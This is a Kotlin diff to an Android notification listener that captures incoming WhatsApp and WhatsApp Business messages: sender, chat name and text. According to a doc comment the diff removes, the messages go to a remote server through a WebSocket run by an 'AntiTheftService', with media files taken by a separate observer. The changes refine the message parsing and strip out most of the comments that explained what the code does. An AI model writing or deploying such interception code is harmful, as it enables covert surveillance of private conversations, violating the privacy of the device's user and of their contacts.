@@ -12,20 +12,6 @@ import android.util.Log
 import kotlinx.serialization.json.Json
 import kotlinx.serialization.builtins.serializer
 
-/**
- * Captures incoming WhatsApp (and WhatsApp Business) notifications and forwards
- * them to the server through the active WebSocket managed by AntiTheftService.
- *
- * Captures:
- * - Single message notifications
- * - Grouped message notifications (MessagingStyle) on Android N+
- * - Media captions/summaries when WhatsApp posts them as text
- *
- * Limitations:
- * - Only messages that generate a notification are captured.
- * - Sent messages are NOT captured here (WhatsApp does not post notifications for them).
- * - Actual media files (images/audio) are captured separately via WhatsAppMediaObserver.
- */
 class WhatsAppNotificationListener : NotificationListenerService() {
 
     override fun onNotificationPosted(sbn: StatusBarNotification) {
@@ -38,7 +24,6 @@ class WhatsAppNotificationListener : NotificationListenerService() {
         val messages = extractMessages(extras, baseTimestamp)
         if (messages.isEmpty()) return
 
-        // Remember the most recent incoming chat address so media files can be associated
         messages.firstOrNull()?.address?.takeIf { it.isNotBlank() }?.let {
             lastAddress = it
         }
@@ -49,11 +34,8 @@ class WhatsAppNotificationListener : NotificationListenerService() {
     }
 
     private fun extractMessages(extras: Bundle, baseTimestamp: Long): List<WhatsMessage> {
-        // 1) Try MessagingStyle bundle array (most reliable on Android N+)
         val fromMessagingStyle = extractFromMessagingStyle(extras, baseTimestamp)
         if (fromMessagingStyle.isNotEmpty()) return fromMessagingStyle
-
-        // 2) Fallback to title/text parsing
         return extractFromTitleText(extras, baseTimestamp)
     }
 
@@ -62,6 +44,8 @@ class WhatsAppNotificationListener : NotificationListenerService() {
         val result = mutableListOf<WhatsMessage>()
 
         val conversationTitle = extras.getCharSequence(Notification.EXTRA_CONVERSATION_TITLE)?.toString()?.trim() ?: ""
+        val isGroup = extras.getBoolean(Notification.EXTRA_IS_GROUP_CONVERSATION, false) || conversationTitle.isNotBlank()
+
         val messagesBundle = extras.getParcelableArray(Notification.EXTRA_MESSAGES)
             ?: extras.getSerializable(Notification.EXTRA_MESSAGES) as? Array<Bundle>
             ?: return result
@@ -69,39 +53,31 @@ class WhatsAppNotificationListener : NotificationListenerService() {
         for (bundle in messagesBundle.filterIsInstance<Bundle>()) {
             val text = bundle.getCharSequence("text")?.toString() ?: continue
             if (text.isBlank()) continue
+            if (isStatusText(text)) continue
 
             val timestamp = if (bundle.containsKey("timestamp")) {
                 bundle.getLong("timestamp", baseTimestamp)
             } else baseTimestamp
 
-            val senderPerson = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
-                bundle.getParcelable<Parcelable>("sender_person") as? Person
-            } else null
+            val sender = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                (bundle.getParcelable<Parcelable>("sender_person") as? Person)?.name?.toString()?.trim() ?: ""
+            } else {
+                bundle.getCharSequence("sender")?.toString()?.trim() ?: ""
+            }
 
-            val sender = senderPerson?.name?.toString()?.trim()
-                ?: bundle.getCharSequence("sender")?.toString()?.trim()
-                ?: ""
+            val chatName = normalizeChatName(conversationTitle.ifBlank { sender })
+            if (chatName.isBlank() || isGenericName(chatName)) continue
 
-                    val isGroup = extras.getBoolean(Notification.EXTRA_IS_GROUP_CONVERSATION, false) ||
-                            conversationTitle.isNotBlank()
+            val body = if (isGroup && sender.isNotBlank() && conversationTitle.isNotBlank() && !text.startsWith(sender)) {
+                "$sender: $text"
+            } else text
 
-                    // For 1-on-1 chats the conversationTitle is usually empty and sender is the contact name.
-                    // For groups: conversationTitle = group name, sender = person name.
-                    val chatName = normalizeChatName(conversationTitle.ifBlank { sender })
-                    if (chatName.isBlank() || isGenericName(chatName)) continue
-
-                    if (isStatusText(text)) continue
-
-                    val body = if (isGroup && sender.isNotBlank() && conversationTitle.isNotBlank() && !text.startsWith(sender)) {
-                        "$sender: $text"
-                    } else text
-
-                    result.add(WhatsMessage(
-                        address = chatName,
-                        name = chatName,
-                        content = body,
-                        timestamp = timestamp
-                    ))
+            result.add(WhatsMessage(
+                address = chatName,
+                name = chatName,
+                content = body,
+                timestamp = timestamp
+            ))
         }
 
         return result
@@ -116,16 +92,11 @@ class WhatsAppNotificationListener : NotificationListenerService() {
             ?: return result
 
         if (rawText.isBlank()) return result
-
         if (isStatusText(rawText)) return result
 
-        // Skip useless generic summaries (e.g. "WhatsApp", "Nova mensagem", "X mensagens")
         val title = normalizeChatName(cleanTitle(rawTitle))
-
-        // "(15 mensagens): João: oi" -> handle summary prefix
         val text = cleanSummaryPrefix(rawText)
 
-        // Group chats often format content as "Sender Name: message text"
         val (sender, body) = parseGroupSender(text)
         val chatName = title.ifBlank { normalizeChatName(sender) }
         if (chatName.isBlank() || isGenericName(chatName)) return result
@@ -142,8 +113,8 @@ class WhatsAppNotificationListener : NotificationListenerService() {
     private fun cleanTitle(title: String): String {
         if (title.isBlank()) return ""
         val lower = title.lowercase()
-        if (lower == "whatsapp" || lower == "nova mensagem" || lower == "mensagem") return ""
-        // Remove trailing summary like " (15 mensagens)" from title
+        if (lower == "whatsapp" || lower == "nova mensagem" || lower == "mensagem" ||
+            lower.startsWith("whatsapp") || lower.startsWith("wa business")) return ""
         return title.replace(Regex("\\s*\\(\\d+\\s+mensagens?\\).*$", RegexOption.IGNORE_CASE), "").trim()
     }
 
@@ -166,20 +137,28 @@ class WhatsAppNotificationListener : NotificationListenerService() {
                 lower == "nova mensagem" || lower == "mensagem" ||
                 lower == "conversas" || lower == "chats" || lower == "status" ||
                 lower == "ligações" || lower == "calls" ||
-                lower == "backup em andamento" || lower == "backup"
+                lower == "backup em andamento" || lower == "backup" ||
+                lower.contains("procurando") || lower.contains("backup") ||
+                lower.contains("não foi possível") || lower.contains("nao foi possivel")
     }
 
     private fun isStatusText(text: String): Boolean {
-        val lower = text.lowercase()
+        val lower = text.lowercase().trim()
         return lower.contains("procurando novas mensagens") ||
                 lower.contains("preparando o backup") ||
                 lower.contains("backup em andamento") ||
-                lower.contains("mensagens de") || // summary like "9 mensagens de 4 conversas"
+                lower.contains("mensagens de") ||
+                lower.contains("não foi possível") ||
+                lower.contains("nao foi possivel") ||
                 lower == "nova mensagem" ||
                 lower == "mensagem" ||
-                lower == "📷 foto" || // standalone media summary without sender
-                lower == "🎤 áudio" ||
-                lower == "🎥 vídeo"
+                lower.startsWith("📷 foto") ||
+                lower.startsWith("🎤 áudio") ||
+                lower.startsWith("🎥 vídeo") ||
+                lower.startsWith("📷📷") ||
+                lower.startsWith("🎤🎤") ||
+                lower.startsWith("🎥🎥") ||
+                lower.contains("toque para")
     }
 
     private fun sendWhatsAppMessage(msg: WhatsMessage) {
@@ -198,17 +177,22 @@ class WhatsAppNotificationListener : NotificationListenerService() {
     }
 
     /**
-     * Removes message-count suffixes and status prefixes from chat names so
-     * messages from the same conversation are not split into multiple profiles.
+     * Normalizes chat name by:
+     * - Stripping leading/trailing emojis (📷, 🎤, 🎥, etc.)
+     * - Removing message-count suffixes like "(6 mensagens)"
+     * - Removing sender suffixes like ": suporte24h"
      */
     private fun normalizeChatName(name: String): String {
         var clean = name.trim()
+
+        // Strip leading emojis and special chars
+        clean = clean.replace(Regex("^[\\p{So}\\p{Cn}]+"), "")
 
         // Remove suffixes like "(6 mensagens)", "(2 mensagens novas)", ": 3 mensagens"
         clean = clean.replace(Regex("\\s*[(\\[]\\d+\\s+mensagens?\\s*(novas?)?[)\\]].*$", RegexOption.IGNORE_CASE), "")
         clean = clean.replace(Regex("\\s*:\\s*\\d+\\s+mensagens?.*$", RegexOption.IGNORE_CASE), "")
 
-        // Remove trailing colon fragments
+        // Remove trailing colon fragments (e.g. ": suporte24h")
         clean = clean.replace(Regex("\\s*:.*$"), "")
 
         return clean.trim()
